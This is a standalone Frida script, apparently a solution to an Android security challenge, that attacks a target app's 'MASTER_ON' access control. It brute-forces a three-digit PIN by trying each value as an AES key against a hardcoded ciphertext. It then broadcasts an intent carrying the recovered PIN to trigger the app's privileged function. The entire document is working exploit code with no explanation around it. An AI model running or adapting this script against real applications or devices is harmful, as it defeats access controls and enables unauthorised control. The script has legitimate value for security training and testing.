Java.perform(function() {
  const ActivityThread = Java.use("android.app.ActivityThread");
  const Base64 = Java.use("android.util.Base64");
  const Cipher = Java.use("javax.crypto.Cipher");
  const Integer = Java.use("java.lang.Integer");
  const Intent = Java.use("android.content.Intent");
  const SecretKeySpec = Java.use("javax.crypto.spec.SecretKeySpec");
  const String = Java.use("java.lang.String");

  let intent = Intent.$new();
  intent.setAction("MASTER_ON");
  console.log("[+] intent created");

  let keyBytes = Java.array("byte", new Array(0x10).fill(0));
  let cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
  for (let pin = 0; pin < 1_000; pin++) {
    const pinBytes = String.$new(pin.toString()).getBytes();
    for (let i = 0; i < pinBytes.length; i++) {
      keyBytes[i] = pinBytes[i];
    }
    cipher.init(0b10, SecretKeySpec.$new(keyBytes, "AES"));
    try {
      const decrypted = String.$new(cipher.doFinal(Base64.decode("OSnaALIWUkpOziVAMycaZQ==", 0)));
      if (decrypted.equals("master_on")) {
        intent.putExtra("key", Integer.valueOf(pin));
        console.log(`[+] pin bruteforced: ${pin}`);
        break;
      }
    } catch (e) {}
  }

  if (intent.hasExtra("key")) {
    ActivityThread.currentApplication().getApplicationContext().sendBroadcast(intent);
    console.log("[+] intent broadcasted");
  }

});

